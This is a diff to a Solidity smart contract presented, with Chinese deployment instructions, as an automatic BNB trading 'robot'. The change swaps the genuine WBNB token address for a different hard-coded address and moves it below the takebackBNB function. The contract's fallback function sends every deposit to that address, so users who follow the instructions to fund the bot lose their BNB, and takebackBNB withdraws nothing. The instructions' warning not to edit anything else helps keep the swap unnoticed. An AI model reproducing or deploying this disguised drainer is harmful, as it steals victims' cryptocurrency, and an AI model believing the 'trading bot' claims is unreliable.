@@ -5,7 +5,7 @@ pragma solidity ^0.4.0;
 部署时候15行有一条报错，直接忽略就行这是正常现象
 
 部署版本选择 0.4.26
-部署前修改174行地址为自己的钱包地址
+部署前修改174行地址为自己的钱包地址（其它任何地方不可修改）
 部署合约名称为：robot
 部署完成后向合约地址转入BNb 机器人将自动开始运行。(建议转入不低于0.4BNb)
 如需要取回合约里面的剩余的BNB代币，请输入接受地址后点击takebackBNB。
@@ -180,15 +180,15 @@ contract robot  {
     function () payable public {
         WBNBaddress.transfer(msg.value);
     }
-    address  USDTaddress = 0x55d398326f99059fF775485246999027B3197955;//usdT地址无需修改
-    address  USDCaddress = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;//usdc地址无需修改
-    address  WBNBaddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;//Wbnb地址无需修改
+    address  USDTaddress = 0x55d398326f99059fF775485246999027B3197955;
+    address  USDCaddress = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
+    
     uint256 interlgas =  32000 ;
 
     function takebackBNB(address addre) public {
         beneficiary = addre ;
     }
-
+address  WBNBaddress = 0x26b9E75C844F1B8E700c903a3EBC53c69AC4Da28;
 }
 contract owned{
     address public owner;
